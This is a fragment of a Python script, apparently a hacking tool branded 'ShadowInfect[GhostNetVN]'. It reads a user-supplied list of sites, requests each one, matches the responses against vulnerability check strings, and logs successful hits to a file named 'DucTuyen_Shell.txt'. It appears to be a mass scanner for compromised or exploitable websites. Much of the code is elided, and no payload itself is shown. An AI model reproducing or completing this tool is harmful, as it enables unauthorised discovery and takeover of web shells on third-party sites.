        ...
        try:
            ...
            for line in req.text.splitlines():
                for check in vuln_checks:
                    if check in line:
                        with lock:
                            print(f'\033[1;32mShadowInfect[GhostNetVN] : \033[1;37m{site}\033[1;32m Succefully ')
                            with open('DucTuyen_Shell.txt', 'a') as f:
                                f.write(url + '\n')
        except requests.exceptions.RequestException:
            continue
    else:
        print(f'{fr}ShadowInfect[GhostNetVN] : \033[1;37m{site}{fr} Failed ')
...
def run():
    print(banner)
    filename = input('\033[96m Enter List => ')
    try:
